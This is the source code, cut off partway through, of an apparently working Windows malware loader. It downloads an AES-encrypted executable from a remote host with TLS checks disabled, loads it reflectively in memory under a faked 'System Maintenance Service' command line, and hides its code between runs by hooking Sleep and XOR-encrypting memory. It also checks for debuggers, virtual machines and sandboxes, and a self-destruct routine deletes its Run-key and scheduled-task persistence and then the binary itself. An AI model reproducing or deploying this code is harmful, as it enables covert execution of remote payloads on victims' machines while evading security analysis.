#define _CRT_RAND_S
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <psapi.h>
#include <winternl.h>
#include <winhttp.h>
#include <wincrypt.h>
#include <shellapi.h> 

// === DECLARACIONES DE HOOKS ===
LPSTR hookGetCommandLineA(void);
LPWSTR hookGetCommandLineW(void);
char*** __cdecl hook__p___argv(void);
wchar_t*** __cdecl hook__p___wargv(void);
int* __cdecl hook__p___argc(void);
int hook__getmainargs(int* _Argc, char*** _Argv, char*** _Env, int _useless_, void* _useless);
int hook__wgetmainargs(int* _Argc, wchar_t*** _Argv, wchar_t*** _Env, int _useless_, void* _useless);
void __stdcall hookExitProcess(UINT statuscode);

#pragma warning(disable: 4996)
#define _CRT_SECURE_NO_WARNINGS

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#endif

#define NtCurrentThread() ((HANDLE)(LONG_PTR)-2)
#define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)

#define WIN32_LEAN_AND_MEAN
#define UNICODE
#define _UNICODE

// === LZSS DECOMPRESSOR (Okumura - in memory) ===
#define EI 11
#define EJ  4
#define P   1
#define N (1 << EI)
#define F ((1 << EJ) + P)

typedef struct {
    const unsigned char* input;
    size_t input_size;
    size_t bit_index;
} BitReader;

static int read_bit(BitReader* br) {
    if (br->bit_index >= br->input_size * 8) return -1;
    size_t byte_index = br->bit_index / 8;
    int bit_in_byte = 7 - (br->bit_index % 8);
    unsigned char byte = br->input[byte_index];
    br->bit_index++;
    return (byte >> bit_in_byte) & 1;
}

static int read_bits(BitReader* br, int n) {
    int value = 0;
    for (int i = 0; i < n; i++) {
        int bit = read_bit(br);
        if (bit == -1) return -1;
        value = (value << 1) | bit;
    }
    return value;
}

void DecryptAES(char* data, DWORD* pDataLen, char* key, DWORD keyLen) {
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    HCRYPTKEY hKey = 0;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return;
    }
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) goto cleanup;
    if (!CryptHashData(hHash, (BYTE*)key, keyLen, 0)) goto cleanup;
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) goto cleanup;

    BYTE iv[16] = {0};
    CryptSetKeyParam(hKey, KP_IV, iv, 0);

    if (!CryptDecrypt(hKey, 0, TRUE, 0, (BYTE*)data, pDataLen)) {
        printf("[-] CryptDecrypt failed: %u\n", GetLastError());
        goto cleanup;
    }

cleanup:
    if (hKey) CryptDestroyKey(hKey);
    if (hHash) CryptDestroyHash(hHash);
    if (hProv) CryptReleaseContext(hProv, 0);
}

// ================== TYPEDEFS & STRUCTS ==================

#ifdef _WIN64
typedef UINT64 UPTR;
#else
typedef UINT32 UPTR;
#endif

typedef enum {
    NoFluctuation = 0,
    FluctuateToRW,
    FluctuateToNA
} TypeOfFluctuation;

typedef struct {
    LPVOID shellcodeAddr;
    SIZE_T shellcodeSize;
    bool   currentlyEncrypted;
    DWORD  encodeKey;
    DWORD  protect;
} FluctuationMetadata;

typedef struct {
    BYTE *originalBytes;
    DWORD originalBytesSize;
    BYTE *previousBytes;
    DWORD previousBytesSize;
} HookTrampolineBuffers;

typedef void (WINAPI *typeSleep)(DWORD ms);
typedef DWORD (NTAPI *typeNtFlushInstructionCache)(HANDLE, PVOID, ULONG);

typedef struct {
    typeSleep origSleep;
    BYTE      sleepStub[16];
} HookedSleep;

typedef struct {
    BYTE *data;
    size_t len;
} DATA;

// ================== GLOBALS ==================

HookedSleep         g_hookedSleep = {0};
FluctuationMetadata g_fluctuationData = {0};
TypeOfFluctuation   g_fluctuate = NoFluctuation;

BOOL hijackCmdline = FALSE;
char* sz_masqCmd_Ansi = NULL;
wchar_t* sz_masqCmd_Widh = NULL;
wchar_t** poi_masqArgvW = NULL;
char** poi_masqArgvA = NULL;
int int_masqCmd_Argc = 0;

// ================== UTIL MACROS ==================

#define log(...) do { printf(__VA_ARGS__); putchar('\n'); fflush(stdout); } while(0)

// ================== FORWARD DECLARATIONS ==================

static inline UPTR get_return_address(void);
static void WINAPI MySleep(DWORD ms);
bool fastTrampoline(bool install, BYTE *target, LPVOID jump, HookTrampolineBuffers *b);
void xor32(uint8_t *buf, SIZE_T sz, uint32_t key);
bool isShellcodeThread(LPVOID addr);
LONG NTAPI VEHHandler(PEXCEPTION_POINTERS xp);
BOOL lzss_decode_mem(const unsigned char* input, size_t input_size, unsigned char** output, size_t* output_size);
DATA GetData(wchar_t* whost, DWORD port, wchar_t* wresource);

// PE loader
void masqueradeCmdline(void);
void freeargvA(char** array, int Argc);
void freeargvW(wchar_t** array, int Argc);
char* GetNTHeaders(char* pe_buffer);
IMAGE_DATA_DIRECTORY* GetPEDirectory(PVOID pe_buffer, size_t dir_id);
BOOL RepairIAT(PVOID modulePtr);
void PELoader(char* data, DWORD datasize);
DWORD WINAPI RunPE(LPVOID lpParameter);

// Anti-analysis & cleanup
BOOL anti_analysis(void);
void selfDestruct(void);

// ================== FLUCTUATION IMPLEMENTATION ==================

static inline UPTR get_return_address(void) {
    return (UPTR)__builtin_return_address(0);
}

void xor32(uint8_t *buf, SIZE_T sz, uint32_t key) {
    SIZE_T i;
    uint32_t *p = (uint32_t*)buf;
    for (i = 0; i < sz/4; ++i) p[i] ^= key;
    for (i = (sz & ~3); i < sz; ++i) buf[i] ^= (uint8_t)(key & 0xFF);
}

// Verifica si la dirección está dentro de .text
bool isShellcodeThread(LPVOID addr) {
    if (!g_fluctuationData.shellcodeAddr || !g_fluctuationData.shellcodeSize)
        return false;
    
    UPTR ip = (UPTR)addr;
    UPTR start = (UPTR)g_fluctuationData.shellcodeAddr;
    UPTR end = start + g_fluctuationData.shellcodeSize;
    return (ip >= start && ip < end);
}

// Fluctuación: encripta/desencripta SOLO .text
void shellcodeEncryptDecrypt(LPVOID caller) {
    if (g_fluctuate == NoFluctuation ||
        !g_fluctuationData.shellcodeAddr ||
        !g_fluctuationData.shellcodeSize ||
        !isShellcodeThread(caller))
        return;

    DWORD old;
    bool toRW = false;

    if (!g_fluctuationData.currentlyEncrypted ||
        (g_fluctuationData.currentlyEncrypted && g_fluctuate == FluctuateToNA)) {
        VirtualProtect(g_fluctuationData.shellcodeAddr,
                       g_fluctuationData.shellcodeSize,
                       PAGE_READWRITE, &old);
        toRW = true;
        log("[>] Flipped to RW");
    }

    log("%s", (g_fluctuationData.currentlyEncrypted ? "[<] Decoding" : "[>] Encoding"));
    xor32((uint8_t*)g_fluctuationData.shellcodeAddr,
          g_fluctuationData.shellcodeSize,
          g_fluctuationData.encodeKey);

    if (!g_fluctuationData.currentlyEncrypted && g_fluctuate == FluctuateToNA) {
        VirtualProtect(g_fluctuationData.shellcodeAddr,
                       g_fluctuationData.shellcodeSize,
                       PAGE_NOACCESS, &old);
        log("[>] Flipped to NoAccess");
    } else if (g_fluctuationData.currentlyEncrypted) {
        VirtualProtect(g_fluctuationData.shellcodeAddr,
                       g_fluctuationData.shellcodeSize,
                       g_fluctuationData.protect, &old);
        log("[<] Flipped back to RX");
    }

    g_fluctuationData.currentlyEncrypted = !g_fluctuationData.currentlyEncrypted;
}

// Hook de Sleep: ya NO inicializa fluctuación (se hace en PELoader)
static void WINAPI MySleep(DWORD ms) {
    LPVOID caller = (LPVOID)get_return_address();
    shellcodeEncryptDecrypt(caller);  // Ya tiene los datos correctos
    log("[>] MySleep(%lu)", ms);

    HookTrampolineBuffers b = {0};
    b.originalBytes = g_hookedSleep.sleepStub;
    b.originalBytesSize = sizeof(g_hookedSleep.sleepStub);

    fastTrampoline(false, (BYTE*)Sleep, (LPVOID)MySleep, &b);
    Sleep(ms);
    if (g_fluctuate == FluctuateToRW)
        shellcodeEncryptDecrypt(caller);
    fastTrampoline(true, (BYTE*)Sleep, (LPVOID)MySleep, NULL);
}

bool fastTrampoline(bool install, BYTE *target, LPVOID jump, HookTrampolineBuffers *b) {
    BYTE trampo32[] = { 0xB8, 0, 0, 0, 0, 0xFF, 0xE0 };
    BYTE trampo64[] = { 0x49, 0xBA, 0, 0, 0, 0, 0, 0, 0, 0, 0x41, 0xFF, 0xE2 };

    BYTE *code;
    DWORD size;
#ifdef _WIN64
    code = trampo64;
    size = sizeof(trampo64);
    memcpy(code + 2, &jump, 8);
#else
    code = trampo32;
    size = sizeof(trampo32);
    uint32_t j32 = (uint32_t)(UPTR)jump;
    memcpy(code + 1, &j32, 4);
#endif

    DWORD old;
    if (!VirtualProtect(target, size, PAGE_EXECUTE_READWRITE, &old))
        return false;

    if (install) {
        if (b && b->previousBytes) {
            memcpy(b->previousBytes, target, size);
            b->previousBytesSize = size;
        }
        memcpy(target, code, size);
    } else {
        if (!b || !b->originalBytes) return false;
        memcpy(target, b->originalBytes, b->originalBytesSize);
        size = b->originalBytesSize;
    }

    typeNtFlushInstructionCache fn = (typeNtFlushInstructionCache)
        GetProcAddress(GetModuleHandleA("ntdll"), "NtFlushInstructionCache");
    if (fn) fn(GetCurrentProcess(), target, size);

    VirtualProtect(target, size, old, &old);
    return true;
}

LONG NTAPI VEHHandler(PEXCEPTION_POINTERS xp) {
    if (xp->ExceptionRecord->ExceptionCode != 0xC0000005) // ACCESS_VIOLATION
        return EXCEPTION_CONTINUE_SEARCH;

#ifdef _WIN64
    UPTR ip = xp->ContextRecord->Rip;
#else
    UPTR ip = xp->ContextRecord->Eip;
#endif

    log("[.] AV at 0x%p", (void*)ip);
    if (isShellcodeThread((LPVOID)ip)) {
        log("[+] Shellcode hit – restoring RX & decrypt");
        shellcodeEncryptDecrypt((LPVOID)ip);
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

// ================== LZSS ==================

BOOL lzss_decode_mem(const unsigned char* input, size_t input_size, unsigned char** output, size_t* output_size) {
    if (!input || input_size == 0 || !output || !output_size) return FALSE;

    BitReader br = {0};
    br.input = input;
    br.input_size = input_size;
    br.bit_index = 0;

    unsigned char* window = (unsigned char*)calloc(N * 2, 1);
    if (!window) return FALSE;
    for (int i = 0; i < N - F; i++) window[i] = ' ';

    size_t out_capacity = 4096;
    unsigned char* out_buf = (unsigned char*)malloc(out_capacity);
    if (!out_buf) { free(window); return FALSE; }
    size_t out_len = 0;

    int r = N - F;
    while (1) {
        int flag = read_bit(&br);
        if (flag == -1) break;

        if (flag) {
            int c = read_bits(&br, 8);
            if (c == -1) break;
            if (out_len >= out_capacity) {
                out_capacity *= 2;
                unsigned char* tmp = (unsigned char*)realloc(out_buf, out_capacity);
                if (!tmp) { free(out_buf); free(window); return FALSE; }
                out_buf = tmp;
            }
            out_buf[out_len] = (unsigned char)c;
            window[r] = (unsigned char)c;
            r = (r + 1) & (N - 1);
            out_len++;
        } else {
            int offset = read_bits(&br, EI);
            int length = read_bits(&br, EJ);
            if (offset == -1 || length == -1) break;
            length += 2;
            if (out_len + length > out_capacity) {
                while (out_capacity < out_len + length) out_capacity *= 2;
                unsigned char* tmp = (unsigned char*)realloc(out_buf, out_capacity);
                if (!tmp) { free(out_buf); free(window); return FALSE; }
                out_buf = tmp;
            }
            for (int k = 0; k < length; k++) {
                unsigned char c = window[(offset + k) & (N - 1)];
                out_buf[out_len] = c;
                window[r] = c;
                r = (r + 1) & (N - 1);
                out_len++;
            }
        }
    }

    free(window);
    *output = out_buf;
    *output_size = out_len;
    return TRUE;
}

// ================== PE LOADER ==================

void masqueradeCmdline() {
    sz_masqCmd_Ansi = "System Maintenance Service";
    int required_size = MultiByteToWideChar(CP_UTF8, 0, sz_masqCmd_Ansi, -1, NULL, 0);
    sz_masqCmd_Widh = (wchar_t*)calloc(required_size + 1, sizeof(wchar_t));
    if (!sz_masqCmd_Widh) return;
    MultiByteToWideChar(CP_UTF8, 0, sz_masqCmd_Ansi, -1, sz_masqCmd_Widh, required_size);
    poi_masqArgvW = CommandLineToArgvW(sz_masqCmd_Widh, &int_masqCmd_Argc);
    if (!poi_masqArgvW) { free(sz_masqCmd_Widh); return; }
    
    int memsize = int_masqCmd_Argc * sizeof(LPSTR);
    for (int i = 0; i < int_masqCmd_Argc; ++i) {
        int len = WideCharToMultiByte(CP_UTF8, 0, poi_masqArgvW[i], -1, NULL, 0, NULL, NULL);
        memsize += len;
    }
    poi_masqArgvA = (LPSTR*)LocalAlloc(LMEM_FIXED, memsize);
    if (!poi_masqArgvA) {
        LocalFree(poi_masqArgvW);
        free(sz_masqCmd_Widh);
        return;
    }
    char* buffer = (char*)poi_masqArgvA + int_masqCmd_Argc * sizeof(LPSTR);
    int bufLen = memsize - int_masqCmd_Argc * sizeof(LPSTR);
    for (int i = 0; i < int_masqCmd_Argc; ++i) {
        int len = WideCharToMultiByte(CP_UTF8, 0, poi_masqArgvW[i], -1, buffer, bufLen, NULL, NULL);
        poi_masqArgvA[i] = buffer;
        buffer += len;
        bufLen -= len;
    }
    hijackCmdline = TRUE;
}

char* GetNTHeaders(char* pe_buffer) {
    if (!pe_buffer) return NULL;
    IMAGE_DOS_HEADER* idh = (IMAGE_DOS_HEADER*)pe_buffer;
    if (idh->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    LONG pe_offset = idh->e_lfanew;
    if (pe_offset < 0 || pe_offset > 1024) return NULL;
    IMAGE_NT_HEADERS* inh = (IMAGE_NT_HEADERS*)(pe_buffer + pe_offset);
    if (inh->Signature != IMAGE_NT_SIGNATURE) return NULL;
    return (char*)inh;
}

IMAGE_DATA_DIRECTORY* GetPEDirectory(PVOID pe_buffer, size_t dir_id) {
    if (dir_id >= IMAGE_NUMBEROF_DIRECTORY_ENTRIES) return NULL;
    char* nt = GetNTHeaders((char*)pe_buffer);
    if (!nt) return NULL;
    IMAGE_NT_HEADERS* nt_header = (IMAGE_NT_HEADERS*)nt;
    IMAGE_DATA_DIRECTORY* dir = &nt_header->OptionalHeader.DataDirectory[dir_id];
    return (dir->VirtualAddress == 0) ? NULL : dir;
}

BOOL RepairIAT(PVOID modulePtr) {
    IMAGE_DATA_DIRECTORY* importsDir = GetPEDirectory(modulePtr, IMAGE_DIRECTORY_ENTRY_IMPORT);
    if (!importsDir) return FALSE;

    size_t impAddr = importsDir->VirtualAddress;
    size_t maxSize = importsDir->Size;
    size_t parsedSize = 0;

    while (parsedSize < maxSize) {
        IMAGE_IMPORT_DESCRIPTOR* desc = (IMAGE_IMPORT_DESCRIPTOR*)((char*)modulePtr + impAddr + parsedSize);
        if (desc->OriginalFirstThunk == 0 && desc->FirstThunk == 0) break;

        char* libName = (char*)modulePtr + desc->Name;
        HMODULE hMod = LoadLibraryA(libName);
        if (!hMod) { parsedSize += sizeof(IMAGE_IMPORT_DESCRIPTOR); continue; }

        size_t thunk = desc->OriginalFirstThunk ? desc->OriginalFirstThunk : desc->FirstThunk;
        size_t iat = desc->FirstThunk;

        for (size_t i = 0; ; i++) {
            IMAGE_THUNK_DATA* iatEntry = (IMAGE_THUNK_DATA*)((char*)modulePtr + iat + i * sizeof(IMAGE_THUNK_DATA));
            IMAGE_THUNK_DATA* origEntry = (IMAGE_THUNK_DATA*)((char*)modulePtr + thunk + i * sizeof(IMAGE_THUNK_DATA));
            if (origEntry->u1.AddressOfData == 0) break;

            if (IMAGE_SNAP_BY_ORDINAL(origEntry->u1.Ordinal)) {
                FARPROC addr = GetProcAddress(hMod, (LPCSTR)IMAGE_ORDINAL(origEntry->u1.Ordinal));
                iatEntry->u1.Function = (ULONG_PTR)addr;
            } else {
                PIMAGE_IMPORT_BY_NAME byName = (PIMAGE_IMPORT_BY_NAME)((char*)modulePtr + origEntry->u1.AddressOfData);
                char* funcName = (char*)byName->Name;
                FARPROC addr = GetProcAddress(hMod, funcName);

                if (hijackCmdline) {
                    if (_stricmp(funcName, "GetCommandLineA") == 0) addr = (FARPROC)hookGetCommandLineA;
                    else if (_stricmp(funcName, "GetCommandLineW") == 0) addr = (FARPROC)hookGetCommandLineW;
                    else if (_stricmp(funcName, "__wgetmainargs") == 0) addr = (FARPROC)hook__wgetmainargs;
                    else if (_stricmp(funcName, "__getmainargs") == 0) addr = (FARPROC)hook__getmainargs;
                    else if (_stricmp(funcName, "__p___argv") == 0) addr = (FARPROC)hook__p___argv;
                    else if (_stricmp(funcName, "__p___wargv") == 0) addr = (FARPROC)hook__p___wargv;
                    else if (_stricmp(funcName, "__p___argc") == 0) addr = (FARPROC)hook__p___argc;
                    // NO HOOK de ExitProcess ni exit (¡causa problemas!)
                }
                iatEntry->u1.Function = (ULONG_PTR)addr;
            }
        }
        parsedSize += sizeof(IMAGE_IMPORT_DESCRIPTOR);
    }
    return TRUE;
}

// Hooks
LPSTR hookGetCommandLineA() { return sz_masqCmd_Ansi; }
LPWSTR hookGetCommandLineW() { return sz_masqCmd_Widh; }
char*** __cdecl hook__p___argv(void) { return &poi_masqArgvA; }
wchar_t*** __cdecl hook__p___wargv(void) { return &poi_masqArgvW; }
int* __cdecl hook__p___argc(void) { return &int_masqCmd_Argc; }
int hook__getmainargs(int* _Argc, char*** _Argv, char*** _Env, int _useless_, void* _useless) {
    *_Argc = int_masqCmd_Argc; *_Argv = poi_masqArgvA; return 0;
}
int hook__wgetmainargs(int* _Argc, wchar_t*** _Argv, wchar_t*** _Env, int _useless_, void* _useless) {
    *_Argc = int_masqCmd_Argc; *_Argv = poi_masqArgvW; return 0;
}
void __stdcall hookExitProcess(UINT statuscode) { ExitThread(0); } // Pero no se usa

DWORD WINAPI RunPE(LPVOID lpParameter) {
    void (*entryPoint)() = (void(*)())lpParameter;
    entryPoint();
    return 0;
}

void PELoader(char* data, DWORD datasize) {
    masqueradeCmdline();
    char* ntHeaderRaw = GetNTHeaders(data);
    if (!ntHeaderRaw) { log("[-] Invalid PE"); return; }
    IMAGE_NT_HEADERS* ntHeader = (IMAGE_NT_HEADERS*)ntHeaderRaw;

    LPVOID preferAddr = (LPVOID)ntHeader->OptionalHeader.ImageBase;
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (ntdll) {
        typedef NTSTATUS (NTAPI *NtUnmapViewOfSection_t)(HANDLE, PVOID);
        NtUnmapViewOfSection_t NtUnmap = (NtUnmapViewOfSection_t)GetProcAddress(ntdll, "NtUnmapViewOfSection");
        if (NtUnmap) NtUnmap(NtCurrentProcess(), preferAddr);
    }

    DWORD allocSize = ntHeader->OptionalHeader.SizeOfImage;
    BYTE* pImageBase = (BYTE*)VirtualAlloc(preferAddr, allocSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pImageBase) {
        pImageBase = (BYTE*)VirtualAlloc(NULL, allocSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!pImageBase) { log("[-] VirtualAlloc failed"); return; }
    }

    memcpy(pImageBase, data, ntHeader->OptionalHeader.SizeOfHeaders);

    IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(ntHeader);
    for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
        if (sec[i].PointerToRawData + sec[i].SizeOfRawData > datasize) {
            log("[-] Section %d out of bounds", i);
            VirtualFree(pImageBase, 0, MEM_RELEASE);
            return;
        }
        memcpy(pImageBase + sec[i].VirtualAddress,
               data + sec[i].PointerToRawData,
               sec[i].SizeOfRawData);
    }

    // === APLICAR FLUCTUACIÓN SOLO A .text ===
    LPVOID textStart = NULL;
    SIZE_T textSize = 0;

    for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
        if (memcmp(sec[i].Name, ".text", 5) == 0 || (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)) {
            textStart = pImageBase + sec[i].VirtualAddress;
            textSize = sec[i].SizeOfRawData;  // ← ¡CORRECCIÓN CLAVE!
            break;
        }
    }

    if (g_fluctuate != NoFluctuation && textStart && textSize > 0) {
        g_fluctuationData.shellcodeAddr = textStart;
        g_fluctuationData.shellcodeSize = textSize;  // ← tamaño correcto
        g_fluctuationData.encodeKey = ((uint32_t)rand() << 16) ^ (uint32_t)rand();
        g_fluctuationData.protect = PAGE_EXECUTE_READ;

        DWORD old;
        if (g_fluctuate == FluctuateToNA) {
            VirtualProtect(textStart, textSize, PAGE_READWRITE, &old);
            xor32((uint8_t*)textStart, textSize, g_fluctuationData.encodeKey);
            VirtualProtect(textStart, textSize, PAGE_NOACCESS, &old);
            g_fluctuationData.currentlyEncrypted = true;
            log("[+] .text set to NOACCESS (encrypted)");
        } else if (g_fluctuate == FluctuateToRW) {
            // ¡NO encriptes! Deja en claro, se encriptará en Sleep()
            VirtualProtect(textStart, textSize, PAGE_EXECUTE_READ, &old);
            g_fluctuationData.currentlyEncrypted = false;
            log("[+] .text set to RX (clear)");
        }
    }

    if (!RepairIAT(pImageBase)) {
        log("[-] IAT repair failed");
        VirtualFree(pImageBase, 0, MEM_RELEASE);
        return;
    }

    ULONG_PTR entryPoint = (ULONG_PTR)pImageBase + ntHeader->OptionalHeader.AddressOfEntryPoint;
    log("[+] Starting PE at %p", (void*)entryPoint);

    HANDLE hThread = CreateThread(NULL, 0, RunPE, (LPVOID)entryPoint, 0, NULL);
    if (hThread) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    } else {
        ((void(*)())entryPoint)();
    }
}

// ================== ANTI-ANALYSIS & CLEANUP ==================

BOOL anti_analysis() {
    if (IsDebuggerPresent()) return TRUE;
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char buffer[256];
        DWORD size = sizeof(buffer);
        if (RegQueryValueExA(hKey, "SystemBiosVersion", NULL, NULL, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
            if (strstr(buffer, "VMWARE") || strstr(buffer, "VBOX") || strstr(buffer, "QEMU") || strstr(buffer, "XEN")) {
                RegCloseKey(hKey);
                return TRUE;
            }
        }
        RegCloseKey(hKey);
    }
    if (GetTickCount() < 60000) return TRUE;
    MEMORYSTATUSEX mem = {0}; mem.dwLength = sizeof(mem);
    GlobalMemoryStatusEx(&mem);
    if (mem.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) return TRUE;
    return FALSE;
}

void selfDestruct() {
    log("[*] Initiating self-destruct...");
    char exePath[MAX_PATH];
    if (!GetModuleFileNameA(NULL, exePath, MAX_PATH)) return;

    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, "SystemMaintenance");
        RegCloseKey(hKey);
    }
    system("schtasks /delete /tn \"SystemMaintenanceTask\" /f > nul 2>&1");

    char cmd[2048];
    snprintf(cmd, sizeof(cmd),
        "cmd.exe /c timeout /t 3 > nul & "
        "powershell -Command \"$ErrorActionPreference='SilentlyContinue'; "
        "for($i=0; $i -lt 5; $i++){ Start-Sleep -Seconds 2; "
        "try{ Remove-Item -Force -Path '%s' -ErrorAction Stop; exit } catch{} }; "
        "Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'SystemMaintenance' -ErrorAction SilentlyContinue\" > nul 2>&1",
        exePath);

    STARTUPINFOA si = {0}; PROCESS_INFORMATION pi = {0}; si.cb = sizeof(si);
    if (CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW | DETACHED_PROCESS, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
    }
    log("[+] Self-destruct sequence activated. Exiting now...");
    ExitProcess(0);
}

DATA GetData(wchar_t* whost, DWORD port, wchar_t* wresource) {
    DATA data = {0};
    unsigned char* buffer = NULL;
    size_t buffer_capacity = 0;
    size_t buffer_size = 0;

    char resourceA[1024] = {0};
    WideCharToMultiByte(CP_UTF8, 0, wresource, -1, resourceA, sizeof(resourceA)-1, NULL, NULL);
    wprintf(L"[*] Downloading: %s (%s)\n", wresource, resourceA);

    HINTERNET hSession = WinHttpOpen(L"Black Basalt Beacon/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) { printf("[-] WinHttpOpen failed (%u)\n", GetLastError()); return data; }

    HINTERNET hConnect = WinHttpConnect(hSession, whost, (USHORT)port, 0);
    if (!hConnect) { printf("[-] WinHttpConnect failed (%u)\n", GetLastError()); WinHttpCloseHandle(hSession); return data; }

    BOOL is_https = (port == 443);
    DWORD flags = is_https ? WINHTTP_FLAG_SECURE : 0;

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", wresource, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hRequest) { printf("[-] WinHttpOpenRequest failed (%u)\n", GetLastError()); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return data; }

    if (is_https) {
        DWORD sec_flags = SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &sec_flags, sizeof(sec_flags));
    }

    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
        printf("[-] WinHttpSendRequest failed (%u)\n", GetLastError());
        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
        return data;
    }

    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        printf("[-] WinHttpReceiveResponse failed (%u)\n", GetLastError());
        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
        return data;
    }

    DWORD dwSize = 0;
    while (WinHttpQueryDataAvailable(hRequest, &dwSize) && dwSize > 0) {
        char* pszOutBuffer = (char*)malloc(dwSize + 1);
        if (!pszOutBuffer) break;
        ZeroMemory(pszOutBuffer, dwSize + 1);
        DWORD dwDownloaded = 0;
        if (!WinHttpReadData(hRequest, pszOutBuffer, dwSize, &dwDownloaded)) {
            free(pszOutBuffer);
            break;
        }

        if (buffer_size + dwDownloaded > buffer_capacity) {
            size_t new_cap = (buffer_size + dwDownloaded) * 2;
            unsigned char* tmp = (unsigned char*)realloc(buffer, new_cap);
            if (!tmp) { free(pszOutBuffer); break; }
            buffer = tmp;
            buffer_capacity = new_cap;
        }

        memcpy(buffer + buffer_size, pszOutBuffer, dwDownloaded);
        buffer_size += dwDownloaded;
        free(pszOutBuffer);
        dwSize = 0;
    }

    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);

    if (buffer_size == 0) {
        printf("[-] No data received\n");
        if (buffer) free(buffer);
    } else {
        data.data = malloc(buffer_size);
        if (data.data) {
            memcpy(data.data, buffer, buffer_size);
            data.len = buffer_size;
            printf("[+] Downloaded %zu bytes\n", buffer_size);
        }
        free(buffer);
    }

    return data;
}

// ================== MAIN ==================

int main(int argc, char** argv) {
    srand(GetTickCount());
    if (anti_analysis()) return 1;

    if (argc != 5) {
        log("[+] Usage: %s <Host> <Port> <Resource> <FluctuationMode>", argv[0]);
        log("  FluctuationMode:");
        log("    0 = No fluctuation");
        log("    1 = RW fluctuation (encrypt when not executing)");
        log("    2 = NOACCESS fluctuation + VEH (ORCA666 style)");
        return 1;
    }

    char* host = argv[1];
    DWORD port = atoi(argv[2]);
    char* resource = argv[3];
    g_fluctuate = (TypeOfFluctuation)atoi(argv[4]);

    // Hook Sleep si fluctuación activa
    if (g_fluctuate != NoFluctuation) {
        log("[.] Hooking Sleep for fluctuation...");
        memcpy(g_hookedSleep.sleepStub, (void*)Sleep, sizeof(g_hookedSleep.sleepStub));
        if (!fastTrampoline(true, (BYTE*)Sleep, (LPVOID)MySleep, NULL)) {
            log("[!] Sleep hook failed");
            return 1;
        }
        if (g_fluctuate == FluctuateToNA) {
            log("[.] Installing VEH for PAGE_NOACCESS");
            AddVectoredExceptionHandler(1, VEHHandler);
        }
    }

    // Convertir args a wide
    int len = MultiByteToWideChar(CP_UTF8, 0, host, -1, NULL, 0);
    wchar_t* whost = (wchar_t*)malloc(len * sizeof(wchar_t));
    MultiByteToWideChar(CP_UTF8, 0, host, -1, whost, len);

    len = MultiByteToWideChar(CP_UTF8, 0, resource, -1, NULL, 0);
    wchar_t* wresource = (wchar_t*)malloc(len * sizeof(wchar_t));
    MultiByteToWideChar(CP_UTF8, 0, resource, -1, wresource, len);

    log("\n[+] Downloading payload %s:%d/%s", host, port, resource);
    DATA payload = GetData(whost, port, wresource);
    if (!payload.data || payload.len < 12) {
        log("[-] Failed to download payload");
        goto cleanup;
    }

    // Parsear payload
    if (payload.len < 4) goto invalid;
    DWORD keyLen = *(DWORD*)payload.data;
    if (keyLen == 0 || keyLen > 1024 || 4 + keyLen + 8 > payload.len) goto invalid;
    char* key = (char*)payload.data + 4;
    DWORD peOriginalSize = *(DWORD*)(payload.data + 4 + keyLen);
    DWORD cipherLen = *(DWORD*)(payload.data + 4 + keyLen + 4);
    if (4 + keyLen + 8 + cipherLen != payload.len) goto invalid;
    char* cipher = (char*)payload.data + 4 + keyLen + 8;

    log("[+] KeyLen: %u | PE Original: %u | Cipher: %u", keyLen, peOriginalSize, cipherLen);

    // Descifrar
